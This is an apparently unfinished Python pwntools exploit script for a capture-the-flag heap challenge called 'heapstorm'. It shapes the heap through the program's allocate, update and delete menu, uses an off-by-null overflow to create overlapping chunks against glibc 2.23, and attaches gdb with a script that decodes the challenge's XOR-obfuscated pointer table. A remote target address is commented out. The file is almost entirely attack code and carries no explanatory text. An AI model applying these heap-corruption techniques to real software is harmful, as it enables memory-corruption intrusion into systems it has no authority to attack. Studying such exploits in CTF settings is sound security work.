# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './heapstorm'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)


def alloc(size): # size(12, 0x1000]
    r.recvuntil("Command: ")
    r.sendline("1")
    r.recvuntil("Size: ")
    r.sendline(str(size))

def update(index, data): # size<=old-size-12
    r.recvuntil("Command: ")
    r.sendline("2")
    r.recvuntil("Index: ")
    r.sendline(str(index))
    r.recvuntil("Size: ")
    r.sendline(str(len(data)))
    r.recvuntil("Content: ")
    r.send(data)

def d(index):
    r.recvuntil("Command: ")
    r.sendline("3")
    r.recvuntil("Index: ")
    r.sendline(str(index))


alloc(0x200-8)#0
alloc(0x220-8)#1
alloc(0x200-8)#2
alloc(0x200-8)#3 #padding



payload = ''
payload += (0x220-0x10-0x10-0x10)*'A'
# payload += p64(0x200) + p64(0x60)
payload += p64(0x200) + p64(0x60)
update(1, payload)
d(1)



payload = ''
payload += 'A'*(0x1f8-12)
update(0, payload) # overflow null

alloc(0x80-8) #1 0x555555757200
alloc(0x80-8) #4 0x555555757280

d(1)
d(2)

alloc(0x110-8) #1
payload = ''
payload += 'A'*0x70
payload +=  p64(0)+p64(0x91)
update(1, payload)

d(4)

# alloc()

# update(0, 'AAA')
# d(0)
# alloc(0x400-8)#0
# alloc(0x200-8) #1






print(str(r.proc.pid))

gdb.attach(r, """

set $k1= *(long *)0x13370800
set $k2= *(long *)0x13370808
set $p0= $k1 ^ *(long *)0x13370820 
set $p1= $k1 ^ *(long *)0x13370830
set $p2= $k1 ^ *(long *)0x13370840
set $p3= $k1 ^ *(long *)0x13370850
define fu
    set $b = 0x13370820
    if $argc > 0
        p/x ($k1 ^ *(long *)($b + ($arg0*0x10) ))-0x10
        p/x ($k2 ^ *(long *)($b + ($arg0*0x10)+0x8 ))
    else
        p/x ($k1 ^ *(long *)0x13370820)-0x10
        p/x ($k1 ^ *(long *)0x13370830)-0x10
        p/x ($k1 ^ *(long *)0x13370840)-0x10
        p/x ($k1 ^ *(long *)0x13370850)-0x10 
        p/x ($k1 ^ *(long *)0x13370860)-0x10
    end 
    if $argc == 2
        # x/$arg1gx ($k1 ^ *(long *)($b + ($arg0*0x10) ))-0x10
    end
end
echo =====0, 1, 2, 3====\\n
fu
echo =====0, 1, 2, 3====\\n
set $pad = 0x13370800
echo enc_pad: \\n
x/30gx 0x13370800

""");
print(str(r.proc.pid))

r.interactive()



# size (12, 0x1000] calloc